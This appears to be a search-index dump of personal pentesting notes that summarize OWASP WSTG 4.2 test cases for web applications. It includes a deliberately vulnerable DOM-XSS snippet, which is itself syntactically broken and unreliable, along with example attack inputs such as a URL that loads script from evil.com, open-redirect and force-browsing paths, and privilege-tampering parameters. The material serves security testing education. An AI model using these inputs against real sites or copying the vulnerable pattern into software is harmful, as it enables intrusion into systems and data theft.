logical limit set on the functions and if it is properly validated.  - For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times. 10.6 WSTG-BUSL-06 Testing for the Circumvention of Work Flows - Review the project documentation for methods to skip or go through steps in the application process in a different order from the intended business logic flow.  - Develop a misuse case and try to circumvent every logic flow identified. 10.7 WSTG-BUSL-07 Test Defenses Against Application Misuse - Generate notes from all tests conducted against the system.  - Review which tests had a different functionality based on aggressive input.  - Understand the defenses in place and verify if they are enough to protect the system against bypassing techniques.  - Measures that might indicate the application has in-built self-defense:  \u2022 Changed responses  \u2022 Blocked requests  \u2022 Actions that log a user out or lock their account 10.8 WSTG-BUSL-08 Test Upload of Unexpected File Types - Review the project documentation for file types that are rejected by the system.  - Verify that the unwelcomed file types are rejected and handled safely. Also, check whether the website only check for \"Content-type\" or file extension.  - Verify that file batch uploads are secure and do not allow any bypass against the set security measures. 10.9 WSTG-BUSL-09 Test Upload of Malicious Files - Identify the file upload functionality.  - Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.  - If documentation is not available then consider what would be appropriate based on the purpose of the application.  - Determine how the uploaded files are processed.  - Obtain or create a set of malicious files for testing.  - Try to upload the malicious files to the application and determine whether it is accepted and processed. 10.10 WSTG-BUSL-10 Test Payment Functionality - Determine whether the business logic for the e-commerce functionality is robust.  - Understand how the payment functionality works.  - Determine whether the payment functionality is secure.","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/#11-client-side-testing","title":"11. Client Side Testing","text":"11. Client Side Testing ID Link to Hackinglife Link to OWASP Description 11.1 WSTG-CLNT-01 Testing for DOM-Based Cross Site Scripting - Identify DOM sinks.  - Build payloads that pertain to every sink type. 11.2 WSTG-CLNT-02 Testing for JavaScript Execution - Identify sinks and possible JavaScript injection points. 11.3 WSTG-CLNT-03 Testing for HTML Injection - Identify HTML injection points and assess the severity of the injected content.  For example: page.html?user= 11.4 WSTG-CLNT-04 Testing for Client-side URL Redirect - Identify injection points that handle URLs or paths.  - Assess the locations that the system could redirect to (Open Redirect).  For example: ?redirect=www.fake-target.site 11.5 WSTG-CLNT-05 Testing for CSS Injection - Identify CSS injection points.  - Assess the impact of the injection. 11.6 WSTG-CLNT-06 Testing for Client-side Resource Manipulation - Identify sinks with weak input validation.  - Assess the impact of the resource manipulation.  For example: www.victim.com/#http://evil.com/js.js 11.7 WSTG-CLNT-07 Testing Cross Origin Resource Sharing - Identify endpoints that implement CORS.  - Ensure that the CORS configuration is secure or harmless. 11.8 WSTG-CLNT-08 Testing for Cross Site Flashing - Decompile and analyze the application's code.  - Assess sinks inputs and unsafe method usages.  For example: file.swf?lang=http://evil 11.9 WSTG-CLNT-09 Testing for Clickjacking - Understand security measures in place.  - Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.  - Assess how strict the security measures are and if they are bypassable. 11.10 WSTG-CLNT-10 Testing WebSockets - Identify the usage of WebSockets by inspecting ws:// or wss:// URI scheme.  - Assess its implementation by using the same tests on normal HTTP channels. 11.11 WSTG-CLNT-11 Testing Web Messaging - Assess the security of the message's origin.  - Validate that it's using safe methods and validating its input. 11.12 WSTG-CLNT-12 Testing Browser Storage - Determine whether the website is storing sensitive data in client-side storage.  - The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries. 11.13 WSTG-CLNT-13 Testing for Cross Site Script Inclusion - Locate sensitive data across the system.  - Assess the leakage of sensitive data through various techniques. 11.14 WSTG-CLNT-14 Testing for Reverse Tabnabbing N/A","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/#12-api-testing","title":"12. API Testing","text":"12. API Testing ID Link to Hackinglife Link to OWASP Description 12.1 WSTG-APIT-01 Testing GraphQL - Assess that a secure and production-ready configuration is deployed.  - Validate all input fields against generic attacks.  - Ensure that proper access controls are applied.","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/WSTG-APIT-01/","title":"Testing GraphQL","text":"<p>OWASP Web Security Testing Guide 4.2 &gt;  12. API Testing &gt; 12.1. Testing GraphQL</p> ID Link to Hackinglife Link to OWASP Description 12.1 WSTG-APIT-01 Testing GraphQL - Assess that a secure and production-ready configuration is deployed.  - Validate all input fields against generic attacks.  - Ensure that proper access controls are applied.","tags":["web pentesting","WSTG-APIT-01"]},{"location":"OWASP/WSTG-ATHN-01/","title":"Testing for Credentials Transported over an Encrypted Channel","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 4. Authentication Testing &gt; 4.1. Testing for Credentials Transported over an Encrypted Channel</p> ID Link to Hackinglife Link to OWASP Description 4.1 WSTG-ATHN-01 Testing for Credentials Transported over an Encrypted Channel N/A, This content has been merged into: WSTG-CRYP-03","tags":["web pentesting","WSTG-ATHN-01"]},{"location":"OWASP/WSTG-ATHN-02/","title":"Testing for Default Credentials","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 4. Authentication Testing &gt; 4.2. Testing for Default Credentials</p> ID Link to Hackinglife Link to OWASP Description 4.2 WSTG-ATHN-02 Testing for Default Credentials - Determine whether the application has any User accounts with default passwords.","tags":["web pentesting","WSTG-ATHN-02"]},{"location":"OWASP/WSTG-ATHN-03/","title":"Testing for Weak Lock Out Mechanism","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 4. Authentication Testing &gt; 4.3. Testing for Weak Lock Out Mechanism</p> ID Link to Hackinglife Link to OWASP Description 4.3 WSTG-ATHN-03 Testing for Weak Lock Out Mechanism - Evaluate the account lockout mechanism's ability to mitigate brute force password guessing.  - Evaluate the unlock mechanism's resistance to unauthorized account unlocking.","tags":["web pentesting","WSTG-ATHN-03"]},{"location":"OWASP/WSTG-ATHN-04/","title":"Testing for Bypassing Authentication Schema","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 4. Authentication Testing &gt; 4.4. Testing for Bypassing Authentication Schema</p> ID Link to Hackinglife Link to OWASP Description 4.4 WSTG-ATHN-04 Testing for Bypassing Authentication Schema - Ensure that authentication is applied across all services that require it.  - Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection","tags":["web pentesting","WSTG-ATHN-04"]},{"location":"OWASP/WSTG-ATHN-05/","title":"Testing for Vulnerable Remember Password","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 4. Authentication Testing &gt; 4.5. Testing for Vulnerable Remember Password</p> ID Link to Hackinglife Link to OWASP Description 4.5 WSTG-ATHN-05 Testing for Vulnerable Remember Password - Validate that the generated session is managed securely and do not put the user's credentials in danger (e.g., cookie)  - Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off?","tags":["web pentesting","WSTG-ATHN-05"]},{"location":"OWASP/WSTG-ATHN-06/","title":"Testing for Browser Cache Weaknesses","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 4. Authentication Testing &gt; 4.6. Testing for Browser Cache Weaknesses</p> ID Link to Hackinglife Link to OWASP Description 4.6 WSTG-ATHN-06 Testing for Browser Cache Weaknesses - Review if the application stores sensitive information on the client-side.  - Review if access can occur without authorization.  - Check browser history issue by clicking \"Back\" button after logging out.  - Check browser cache issue from HTTP response headers (Cache-Control: nocache)","tags":["web pentesting","WSTG-ATHN-06"]},{"location":"OWASP/WSTG-ATHN-07/","title":"Testing for Weak Password Policy","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 4. Authentication Testing &gt; 4.7. Testing for Weak Password Policy</p> ID Link to Hackinglife Link to OWASP Description 4.7 WSTG-ATHN-07 Testing for Weak Password Policy - Determine the resistance of the application against brute Force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.  - Review whether new User accounts are created with weak or predictable passwords.","tags":["web pentesting","WSTG-ATHN-07"]},{"location":"OWASP/WSTG-ATHN-08/","title":"Testing for Weak Security Question Answer","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 4. Authentication Testing &gt; 4.8. Testing for Weak Security Question Answer</p> ID Link to Hackinglife Link to OWASP Description 4.8 WSTG-ATHN-08 Testing for Weak Security Question Answer - Determine the complexity and how straight-forward the questions are (Weak pre-generated questions, Weak self-generated question)  - Assess possible user answers and brute force capabilities.","tags":["web pentesting","WSTG-ATHN-08"]},{"location":"OWASP/WSTG-ATHN-09/","title":"Testing for Weak Password Change or Reset Functionalities","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 4. Authentication Testing &gt; 4.9. Testing for Weak Password Change or Reset Functionalities</p> ID Link to Hackinglife Link to OWASP Description 4.9 WSTG-ATHN-09 Testing for Weak Password Change or Reset Functionalities - Determine whether the password change and reset functionality allows accounts to be compromised.  - Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?)  - Test password change (Need old password?)","tags":["web pentesting","WSTG-ATHN-09"]},{"location":"OWASP/WSTG-ATHN-10/","title":"Testing for Weaker Authentication in Alternative Channel","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 4. Authentication Testing &gt; 4.10. Testing for Weaker Authentication in Alternative Channel</p> ID Link to Hackinglife Link to OWASP Description 4.10 WSTG-ATHN-10 Testing for Weaker Authentication in Alternative Channel - Identify alternative authentication channels.  - Assess the security measures used and if any bypasses exists on the alternative channels.","tags":["web pentesting","WSTG-ATHN-10"]},{"location":"OWASP/WSTG-ATHN-11/","title":"Testing Multi-Factor Authentication (MFA)","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 4. Authentication Testing &gt; 4.11. Testing Multi-Factor Authentication (MFA)</p> ID Link to Hackinglife Link to OWASP Description 4.11 WSTG-ATHN-11 Testing Multi-Factor Authentication (MFA) - Identify the type of MFA used by the application.  - Determine whether the MFA implementation is robust and secure.  - Attempt to bypass the MFA.","tags":["web pentesting","WSTG-ATHN-11"]},{"location":"OWASP/WSTG-ATHZ-01/","title":"Testing Directory Traversal File Include","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 5. Authorization Testing &gt; 5.1. Testing Directory Traversal File Include</p> ID Link to Hackinglife Link to OWASP Description 5.1 WSTG-ATHZ-01 Testing Directory Traversal File Include - Identify injection points that pertain to path traversal.  - Assess bypassing techniques and identify the extent of path traversal (dot-dot-slash attack, Local/Remote file inclusion)","tags":["web pentesting","WSTG-ATHZ-01"]},{"location":"OWASP/WSTG-ATHZ-01/#see-my-notes","title":"See my notes","text":"<p>See my notes on Local File Inclusion</p> <p>See my notes on Remote File Inclusion</p>","tags":["web pentesting","WSTG-ATHZ-01"]},{"location":"OWASP/WSTG-ATHZ-02/","title":"Testing for Bypassing Authorization Schema","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 5. Authorization Testing &gt; 5.2. Testing for Bypassing Authorization Schema</p> ID Link to Hackinglife Link to OWASP Description 5.2 WSTG-ATHZ-02 Testing for Bypassing Authorization Schema - Assess if horizontal or vertical access is possible.  - Access to Administrative functions by force browsing (/admin/addUser)","tags":["web pentesting","WSTG-ATHZ-02"]},{"location":"OWASP/WSTG-ATHZ-02/#see-my-notes","title":"See my notes","text":"<ul> <li>Broken access control: What is it. How this attack works. Attack classification. Types of databases. Payloads. Dictionaries.</li> </ul>","tags":["web pentesting","WSTG-ATHZ-02"]},{"location":"OWASP/WSTG-ATHZ-03/","title":"Testing for Privilege Escalation","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 5. Authorization Testing &gt; 5.3. Testing for Privilege Escalation</p> ID Link to Hackinglife Link to OWASP Description 5.3 WSTG-ATHZ-03 Testing for Privilege Escalation - Identify injection points related to role/privilege manipulation. For example: Change some param groupid=2 to groupid=1  - Verify that it is not possible for a user to modify their privileges or roles inside the application  - Fuzz or otherwise attempt to bypass security measures.","tags":["web pentesting","WSTG-ATHZ-03"]},{"location":"OWASP/WSTG-ATHZ-04/","title":"Testing for Insecure Direct Object References","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 5. Authorization Testing &gt; 5.4. Testing for Insecure Direct Object References</p> ID Link to Hackinglife Link to OWASP Description 5.4 WSTG-ATHZ-04 Testing for Insecure Direct Object References - Identify points where object references may occur.  - Assess the access control measures and if they're vulnerable to IDOR. For example: Force changing parameter value (?invoice=123 -&gt; ?invoice=456)","tags":["web pentesting","WSTG-ATHZ-04"]},{"location":"OWASP/WSTG-ATHZ-05/","title":"Testing for OAuth Weaknesses","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 5. Authorization Testing &gt; 5.5. Testing for OAuth Weaknesses</p> ID Link to Hackinglife Link to OWASP Description 5.5 WSTG-ATHZ-05 Testing for OAuth Weaknesses - Determine if OAuth2 implementation is vulnerable or using a deprecated or custom implementation.","tags":["web pentesting","WSTG-ATHZ-05"]},{"location":"OWASP/WSTG-BUSL-01/","title":"Test Business Logic Data Validation","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 10. Business logic Testing &gt; 10.1. Test Business Logic Data Validation </p> ID Link to Hackinglife Link to OWASP Description 10.1 WSTG-BUSL-01 Test Business Logic Data Validation - Identify data injection points.  - Validate that all checks are occurring on the back end and can't be bypassed.  - Attempt to break the format of the expected data and analyze how the application is handling it.","tags":["web pentesting","WSTG-BUSL-01"]},{"location":"OWASP/WSTG-BUSL-02/","title":"Test Ability to Forge Requests","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 10. Business logic Testing &gt; 10.2.  Test Ability to Forge Requests </p> ID Link to Hackinglife Link to OWASP Description 10.2 WSTG-BUSL-02 Test Ability to Forge Requests - Review the project documentation looking for guessable, predictable, or hidden functionality of fields.  - Insert logically valid data in order to bypass normal business logic workflow.","tags":["web pentesting","WSTG-BUSL-02"]},{"location":"OWASP/WSTG-BUSL-03/","title":"Test Integrity Checks","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 10. Business logic Testing &gt; 10.3. Test Integrity Checks </p> ID Link to Hackinglife Link to OWASP Description 10.3 WSTG-BUSL-03 Test Integrity Checks - Review the project documentation for components of the system that move, store, or handle data.  - Determine what type of data is logically acceptable by the component and what types the system should guard against.  - Determine who should be allowed to modify or read that data in each component.  - Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workflow.","tags":["web pentesting","WSTG-BUSL-03"]},{"location":"OWASP/WSTG-BUSL-04/","title":"Test for Process Timing","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 10. Business logic Testing &gt; 10.4. Test for Process Timing </p> ID Link to Hackinglife Link to OWASP Description 10.4 WSTG-BUSL-04 Test for Process Timing - Review the project documentation for system functionality that may be impacted by time. Such as execution time or actions that help users predict a future outcome or allow one to circumvent any part of the business logic or workflow. For example, not completing transactions in an expected time.  - Develop and execute the mis-use cases ensuring that attackers can not gain an advantage based on any timing (Race Condition).","tags":["web pentesting","WSTG-BUSL-04"]},{"location":"OWASP/WSTG-BUSL-05/","title":"Test Number of Times a Function Can Be Used Limits","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 10. Business logic Testing &gt; 10.5. Test Number of Times a Function Can Be Used Limits </p> ID Link to Hackinglife Link to OWASP Description 10.5 WSTG-BUSL-05 Test Number of Times a Function Can Be Used Limits - Identify functions that must set limits to the times they can be called.  - Assess if there is a logical limit set on the functions and if it is properly validated.  - For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times.","tags":["web pentesting","WSTG-BUSL-05"]},{"location":"OWASP/WSTG-BUSL-06/","title":"Testing for the Circumvention of Work Flows","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 10. Business logic Testing &gt; 10.6. Testing for the Circumvention of Work Flows </p> ID Link to Hackinglife Link to OWASP Description 10.6 WSTG-BUSL-06 Testing for the Circumvention of Work Flows - Review the project documentation for methods to skip or go through steps in the application process in a different order from the intended business logic flow.  - Develop a misuse case and try to circumvent every logic flow identified.","tags":["web pentesting","WSTG-BUSL-06"]},{"location":"OWASP/WSTG-BUSL-07/","title":"Test Defenses Against Application Misuse","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 10. Business logic Testing &gt; 10.7. Test Defenses Against Application Misuse </p> ID Link to Hackinglife Link to OWASP Description 10.7 WSTG-BUSL-07 Test Defenses Against Application Misuse - Generate notes from all tests conducted against the system.  - Review which tests had a different functionality based on aggressive input.  - Understand the defenses in place and verify if they are enough to protect the system against bypassing techniques.  - Measures that might indicate the application has in-built self-defense:  \u2022 Changed responses  \u2022 Blocked requests  \u2022 Actions that log a user out or lock their account","tags":["web pentesting","WSTG-BUSL-07"]},{"location":"OWASP/WSTG-BUSL-08/","title":"Test Upload of Unexpected File Types","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 10. Business logic Testing &gt; 10.8. Test Upload of Unexpected File Types </p> ID Link to Hackinglife Link to OWASP Description 10.8 WSTG-BUSL-08 Test Upload of Unexpected File Types - Review the project documentation for file types that are rejected by the system.  - Verify that the unwelcomed file types are rejected and handled safely. Also, check whether the website only check for \"Content-type\" or file extension.  - Verify that file batch uploads are secure and do not allow any bypass against the set security measures.","tags":["web pentesting","WSTG-BUSL-08"]},{"location":"OWASP/WSTG-BUSL-08/#see-my-notes-on-arbitrary-file-upload","title":"See my notes on Arbitrary File Upload","text":"<p>See my notes on Arbitrary File Upload</p>","tags":["web pentesting","WSTG-BUSL-08"]},{"location":"OWASP/WSTG-BUSL-09/","title":"Test Upload of Malicious Files","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 10. Business logic Testing &gt; 10.9. Test Upload of Malicious Files </p> ID Link to Hackinglife Link to OWASP Description 10.9 WSTG-BUSL-09 Test Upload of Malicious Files - Identify the file upload functionality.  - Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.  - If documentation is not available then consider what would be appropriate based on the purpose of the application.  - Determine how the uploaded files are processed.  - Obtain or create a set of malicious files for testing.  - Try to upload the malicious files to the application and determine whether it is accepted and processed.","tags":["web pentesting","WSTG-BUSL-09"]},{"location":"OWASP/WSTG-BUSL-09/#see-my-notes-on-arbitrary-file-upload","title":"See my notes on Arbitrary File Upload","text":"<p>See my notes on Arbitrary File Upload</p>","tags":["web pentesting","WSTG-BUSL-09"]},{"location":"OWASP/WSTG-BUSL-10/","title":"Test Payment Functionality","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 10. Business logic Testing &gt; 10.10. Test Payment Functionality </p> ID Link to Hackinglife Link to OWASP Description 10.10 WSTG-BUSL-10 Test Payment Functionality - Determine whether the business logic for the e-commerce functionality is robust.  - Understand how the payment functionality works.  - Determine whether the payment functionality is secure.","tags":["web pentesting","WSTG-BUSL-10"]},{"location":"OWASP/WSTG-CLNT-01/","title":"Testing for DOM-Based Cross Site Scripting","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.1. Testing for DOM-Based Cross Site Scripting</p> ID Link to Hackinglife Link to OWASP Description 11.1 WSTG-CLNT-01 Testing for DOM-Based Cross Site Scripting - Identify DOM sinks.  - Build payloads that pertain to every sink type. <p>The key in exploiting this XSS flaw is that the client-side script code can access the browser's DOM, thus all the information available in it. Examples of this information are the URL, history, cookies, local storage,...  Technically there are two keywords: sources and sinks. Let's use the following vulnerable code:</p>","tags":["web pentesting","WSTG-CLNT-01"]},{"location":"OWASP/WSTG-CLNT-01/#causes","title":"Causes","text":"<p>This vulnerable code in a welcome page may lead to a DOM XSS attack: http://example.com/#w!Giuseppe</p> <pre><code>&lt;h1 id='welcome'&gt;&lt;/h1&gt;\n&lt;script&gt;\n    var w = \"Welcome\";\n    var name = document.location.hash.search(/#W!1)+3,\n                document.location.hash.length\n                );\n    document.getElementById('Welcome').innerHTML = w + name;\n&lt;/script&gt;\n</code></pre> <p>location.hash is the source of the untrusted input. .innerHTML is the sink where the input is used.</p> <p>To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript. The most common source for DOM XSS is the URL, which is typically accessed with the\u00a0<code>window.location</code>\u00a0object.</p> <p>What is a sink? A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the\u00a0<code>eval()</code>\u00a0function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is\u00a0<code>document.body.innerHTML</code>\u00a0because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.</p> <p>Summing up: you should avoid allowing data from any untrusted source to be dynamically written to the HTML document.</p> <p>Which sinks can lead to DOM-XSS vulnerabilities:</p> <ul> <li>document.write()</li> <li>document.writeln() </li> <li>document.replace()</li> <li>document.domain </li> <li>element.innerHTML </li> <li>element.outerHTML </li> <li>element.insertAdjacentHTML </li> <li>element.onevent</li> </ul> <p>This project, DOMXSS wiki aims to identify sources and sinks methods exposed by public, widely used javascript frameworks.</p>","tags":["web pentesting","WSTG-CLNT-01"]},{"location":"OWASP/WSTG-CLNT-01/#attack-techniques","title":"Attack techniques","text":"<p>Go to my XSS cheat sheet</p>","tags":["web pentesting","WSTG-CLNT-01"]},{"location":"OWASP/WSTG-CLNT-02/","title":"Testing for JavaScript Execution","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.2. Testing for JavaScript Execution</p> ID Link to Hackinglife Link to OWASP Description 11.2 WSTG-CLNT-02 Testing for JavaScript Execution - Identify sinks and possible JavaScript injection points.","tags":["web pentesting","WSTG-CLNT-02"]},{"location":"OWASP/WSTG-CLNT-03/","title":"Testing for HTML Injection","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.3. Testing for HTML Injection</p> ID Link to Hackinglife Link to OWASP Description 11.3 WSTG-CLNT-03 Testing for HTML Injection - Identify HTML injection points and assess the severity of the injected content.  For example: page.html?user=","tags":["web pentesting","WSTG-CLNT-03"]},{"location":"OWASP/WSTG-CLNT-04/","title":"Testing for Client-side URL Redirect","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.4. Testing for Client-side URL Redirect</p> ID Link to Hackinglife Link to OWASP Description 11.4 WSTG-CLNT-04 Testing for Client-side URL Redirect - Identify injection points that handle URLs or paths.  - Assess the locations that the system could redirect to (Open Redirect).  For example: ?redirect=www.fake-target.site","tags":["web pentesting","WSTG-CLNT-04"]},{"location":"OWASP/WSTG-CLNT-05/","title":"Testing for CSS Injection","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.5. Testing for CSS Injection</p> ID Link to Hackinglife Link to OWASP Description 11.5 WSTG-CLNT-05 Testing for CSS Injection - Identify CSS injection points.  - Assess the impact of the injection.","tags":["web pentesting","WSTG-CLNT-05"]},{"location":"OWASP/WSTG-CLNT-06/","title":"Testing for Client-side Resource Manipulation","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.6. Testing for Client-side Resource Manipulation</p> ID Link to Hackinglife Link to OWASP Description 11.6 WSTG-CLNT-06 Testing for Client-side Resource Manipulation - Identify sinks with weak input validation.  - Assess the impact of the resource manipulation.  For example: www.victim.com/#http://evil.com/js.js","tags":["web pentesting","WSTG-CLNT-06"]},{"location":"OWASP/WSTG-CLNT-07/","title":"Testing Cross Origin Resource Sharing","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.7. Testing Cross Origin Resource Sharing</p> ID Link to Hackinglife Link to OWASP Description 11.7 WSTG-CLNT-07 Testing Cross Origin Resource Sharing - Identify endpoints that implement CORS.  - Ensure that the CORS configuration is secure or harmless.","tags":["web pentesting","WSTG-CLNT-07"]},{"location":"OWASP/WSTG-CLNT-08/","title":"Testing for Cross Site Flashing","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.8. Testing for Cross Site Flashing</p> ID Link to Hackinglife Link to OWASP Description 11.8 WSTG-CLNT-08 Testing for Cross Site Flashing - Decompile and analyze the application's code.  - Assess sinks inputs and unsafe method usages.  For example: file.swf?lang=http://evil","tags":["web pentesting","WSTG-CLNT-08"]},{"location":"OWASP/WSTG-CLNT-09/","title":"Testing for Clickjacking","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.9. Testing for Clickjacking</p> ID Link to Hackinglife Link to OWASP Description 11.9 WSTG-CLNT-09 Testing for Clickjacking - Understand security measures in place.  - Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.  - Assess how strict the security measures are and if they are bypassable.","tags":["web pentesting","WSTG-CLNT-09"]},{"location":"OWASP/WSTG-CLNT-10/","title":"Testing WebSockets","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.10. Testing WebSockets</p> ID Link to Hackinglife Link to OWASP Description 11.10 WSTG-CLNT-10 Testing WebSockets - Identify the usage of WebSockets by inspecting ws:// or wss:// URI scheme.  - Assess its implementation by using the same tests on normal HTTP channels.","tags":["web pentesting","WSTG-CLNT-10"]},{"location":"OWASP/WSTG-CLNT-11/","title":"Testing Web Messaging","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.11. Testing Web Messaging</p> ID Link to Hackinglife Link to OWASP Description 11.11 WSTG-CLNT-11 Testing Web Messaging - Assess the security of the message's origin.  - Validate that it's using safe methods and validating its input.","tags":["web pentesting","WSTG-CLNT-11"]},{"location":"OWASP/WSTG-CLNT-12/","title":"Testing Browser Storage","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.12. Testing Browser Storage</p> ID Link to Hackinglife Link to OWASP Description 11.12 WSTG-CLNT-12 Testing Browser Storage - Determine whether the website is storing sensitive data in client-side storage.  - The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries.","tags":["web pentesting","WSTG-CLNT-12"]},{"location":"OWASP/WSTG-CLNT-13/","title":"Testing for Cross Site Script Inclusion","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.13. Testing for Cross Site Script Inclusion</p> ID Link to Hackinglife Link to OWASP Description 11.13 WSTG-CLNT-13 Testing for Cross Site Script Inclusion - Locate sensitive data across the system.  - Assess the leakage of sensitive data through various techniques.","tags":["web pentesting","WSTG-CLNT-13"]},{"location":"OWASP/WSTG-CLNT-14/","title":"Testing for Reverse Tabnabbing","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 11. Client Side Testing &gt; 11.14. Testing for Reverse Tabnabbing</p> ID Link to Hackinglife Link to OWASP Description 11.14 WSTG-CLNT-14 Testing for Reverse Tabnabbing N/A","tags":["web pentesting","WSTG-CLNT-14"]},{"location":"OWASP/WSTG-CONF-01/","title":"Test Network Infrastructure Configuration","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.1. Test Network Infrastructure Configuration</p> ID Link to Hackinglife Link to OWASP Description 2.1 WSTG-CONF-01 Test Network Infrastructure Configuration - Review the applications' configurations set across the network and validate that they are not vulnerable.  - Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.","tags":["web pentesting","reconnaissance","WSTG-CONF-01","dorkings"]},{"location":"OWASP/WSTG-CONF-02/","title":"Test Application Platform Configuration","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.2. Test Application Platform Configuration</p> ID Link to Hackinglife Link to OWASP Description 2.2 WSTG-CONF-02 Test Application Platform Configuration - Ensure that defaults and known files have been removed. - Review configuration and server handling (40, 50)  - Validate that no debugging code or extensions are left in the production environments.  - Review the logging mechanisms set in place for the application including Log Location, Log Storage , Log Rotation, Log Access Control, Log Review","tags":["web pentesting","reconnaissance","WSTG-CONF-02"]},{"location":"OWASP/WSTG-CONF-03/","title":"Test File Extensions Handling for Sensitive Information","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.3. Test File Extensions Handling for Sensitive Information</p> ID Link to Hackinglife Link to OWASP Description 2.3 WSTG-CONF-03 Test File Extensions Handling for Sensitive Information - Dirbust sensitive file extensions, or extensions that might contain raw data (e.g. scripts, raw data, credentials, etc.). - Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)  - Validate that no system framework bypasses exist on the rules set.","tags":["web pentesting","reconnaissance","WSTG-CONF-03"]},{"location":"OWASP/WSTG-CONF-04/","title":"Review Old Backup and Unreferenced Files for Sensitive Information","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.4. Review Old Backup and Unreferenced Files for Sensitive Information</p> ID Link to Hackinglife Link to OWASP Description 2.4 WSTG-CONF-04 Review Old Backup and Unreferenced Files for Sensitive Information - Find and analyse unreferenced files that might contain sensitive information.  - Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename","tags":["web pentesting","reconnaissance","WSTG-CONF-04"]},{"location":"OWASP/WSTG-CONF-05/","title":"Enumerate Infrastructure and Application Admin Interfaces","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.5. Enumerate Infrastructure and Application Admin Interfaces</p> ID Link to Hackinglife Link to OWASP Description 2.5 WSTG-CONF-05 Enumerate Infrastructure and Application Admin Interfaces - Identify hidden administrator interfaces and functionality.  - Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080)","tags":["web pentesting","reconnaissance","WSTG-CONF-05"]},{"location":"OWASP/WSTG-CONF-06/","title":"Test HTTP Methods","text":"<p>OWASP</p> <p>OWASP Web Security Testing Guide 4.2 &gt; 2. Configuration and Deploy Management Testing&gt; 2.6. Test HTTP Methods</p> ID Link to Hackinglife Link to OWASP Description 2.6 WSTG-CONF-06 Test HTTP Methods - 